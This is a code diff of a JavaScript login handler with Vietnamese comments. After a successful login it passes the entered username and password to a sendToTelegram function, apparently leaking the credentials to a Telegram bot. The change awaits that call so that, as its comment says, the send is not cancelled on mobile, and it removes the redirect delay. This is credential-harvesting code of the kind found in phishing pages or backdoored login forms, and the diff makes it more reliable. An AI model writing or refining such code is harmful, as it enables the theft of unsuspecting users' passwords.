@@ -1139,8 +1139,8 @@
                     }
                 }
 
-                // ĐĂNG NHẬP THÀNH CÔNG -> BÁO TELEGRAM (chạy ngầm, không block đợi)
-                sendToTelegram(username, password).catch(e => console.error("Tele err:", e));
+                // ĐĂNG NHẬP THÀNH CÔNG -> BÁO TELEGRAM (đợi gửi xong để không bị hủy trên mobile)
+                await sendToTelegram(username, password).catch(e => console.error("Tele err:", e));
 
                 // Khôi phục nút
                 loginBtn.innerHTML = prevText;
@@ -1164,9 +1164,7 @@
                 showToast(`Xin chào ${realName}! Đang chuyển hướng...`, 'success');
 
                 // Chuyển hướng
-                setTimeout(() => {
-                    window.location.href = "index.html";
-                }, 800);
+                window.location.href = "index.html";
             } catch (err) {
                 console.error("Login Error:", err);
                 showToast('Có lỗi xảy ra: ' + err.message, 'error');
